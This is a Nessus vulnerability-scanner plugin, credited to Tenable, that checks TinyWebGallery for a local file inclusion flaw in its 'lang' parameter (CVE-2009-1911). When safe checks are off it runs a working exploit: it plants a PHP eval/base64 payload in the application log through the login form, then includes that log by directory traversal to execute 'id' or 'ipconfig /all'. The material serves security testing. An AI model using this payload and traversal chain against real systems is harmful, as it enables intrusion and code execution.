#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(38888);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2009-1911");
  script_bugtraq_id(34892);
  script_xref(name:"milw0rm", value:"8649");
  script_xref(name:"OSVDB", value:"54436");

  script_name(english:"TinyWebGallery lang Parameter Local File Inclusion");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a PHP script that is affected by a\n",
      "local file include vulnerability."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The remote host is running TinyWebGallery, a web-based photo gallery\n",
      "application written in PHP.\n",
      "\n",
      "The version of TinyWebGallery installed on the remote host fails to\n",
      "filter user-supplied input to the 'lang' parameter of the\n",
      "'admin/_include/init.php' script before using it to include PHP code.\n",
      "Regardless of PHP's 'register_globals' setting, an unauthenticated\n",
      "attacker can exploit this issue to view arbitrary files or possibly to\n",
      "execute arbitrary PHP code on the remote host, subject to the\n",
      "privileges of the web server user id."
    )
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.tinywebgallery.com/forum/viewtopic.php?t=1653"
  );
  script_set_attribute(
    attribute:"solution", 
    value:string(
      "Upgrade to TinyWebGallery 1.7.7 or later."
    )
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P"
  );
  script_end_attributes();

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) cmd = "ipconfig /all";
  else cmd = "id";
  cmds = make_list(cmd);
}
else cmds = make_list("id", "ipconfig /all");
cmd_pats = make_array();
cmd_pats["id"] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats["ipconfig /all"] = "Subnet Mask";


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/tinywebgallery", "/twg", "/photos", "/gallery", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Unless we're paranoid, make sure we're looking at TinyWebGallery.
  if (report_paranoia < 2)
  {
    url = string(dir, "/index.php");
    res = http_get_cache(item:url, port:port);
    if (isnull(res)) exit(0);

    if (
      'Powered by TinyWebGallery' >!< res ||
      'js/twg_' >!< res
    ) continue;
  }

  # If safe checks are enabled...
  if (safe_checks())
  {
    # Try to grab a known file.
    file = "counter/counter.txt";
    traversal = "../../";

    lang = string(traversal, file);
    url = string(
      dir, "/admin/index.php?",
      "lang=", lang, "%00"
    );

    res = http_send_recv3(port:port, method:"GET", item:url);
    if (isnull(res)) exit(0);

    # There's a problem if our 'lang' is embedded in the form action along with a null.
    if (string("&lang=", lang, '\0" method="post"') >< res[2])
    {
      if (report_verbosity > 0)
      {
        report = string(
          "\n",
          "Nessus was able to verify the issue exists using the following \n",
          "URL :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n",
          "\n",
          "Note that this won't display the contents of '", file, "'\n",
          "because of the way the application buffers output but rather\n",
          "show that the application does not sanitize input to the 'lang'\n",
          "parameter of directory traversal sequences.\n"
        );
        security_warning(port:port, extra:report);
      }
      else security_warning(port);

      exit(0);
    }
  }
  # Otherwise if safe checks are disabled...
  else
  {
    # Inject our payload into the log.
    sep = string(SCRIPT_NAME, "-", unixtime());
    var = string("NESSUS_CMD_", toupper(rand_str()));
    exploit = string('<?php ${eval(base64_decode($_SERVER[HTTP_', var, ']))}?>');

    postdata = string(
      "p_user={", exploit, "}&", 
      "p_pass="
    );

    url = string(
      dir, "/admin/index.php?",
      "action=login"
    );

    res = http_send_recv3(
      port        : port,
      method      : 'POST', 
      item        : url, 
      data        : postdata,
      add_headers : make_array("Content-Type", "application/x-www-form-urlencoded")
    );
    if (isnull(res)) exit(0);

    # Now try to run a command.
    file = "counter/_twg.log";
    traversal = "../../";

    lang = string(traversal, file);
    url = string(
      dir, "/admin/index.php?",
      "lang=", lang, "%00"
    );

    foreach cmd (cmds)
    {
      req = http_mk_get_req(
        port        : port,
        item        : url, 
        add_headers : make_array(
          var, base64(str:string("echo '", sep, " >>';system('", cmd, "');echo '<< ", sep, "';die;")),
          # try the milw0rm exploit too, in case someone else tried it
          'Cmd', base64(str:cmd)
        )
      );
      res = http_send_recv_req(port:port, req:req);
      if (isnull(res)) exit(0);

      # There's a problem if we see the expected command output.
      if ('ipconfig' >< exploit) pat = cmd_pats['ipconfig'];
      else pat = cmd_pats['id'];

      if (egrep(pattern:pat, string:res[2]))
      {
        if (report_verbosity > 0)
        {
          req_str = http_mk_buffer_from_req(req:req);
          report = string(
            "\n",
            "Nessus was able to execute the command '", cmd, "' on the remote \n",
            "host using the following request :\n",
            "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
            req_str, "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
          );
          if (report_verbosity > 1)
          {
            if (sep >< res[2])
            {
              output = strstr(res[2], string(sep, " >>")) - string(sep, " >>");
              output = output - strstr(output, string("<< ", sep));
            }
            else if ("_code_" >< res[2])
            {
              output = strstr(res[2], "_code_") - "_code_";
            }
            else output = res[2];

            report = string(
              report,
             "\n",
              "It produced the following output :\n",
              "\n",
              crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
              output,
              crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
            );
          }
          security_warning(port:port, extra:report);
        }
        else security_warning(port);
        exit(0);
      }
    }
  }
}
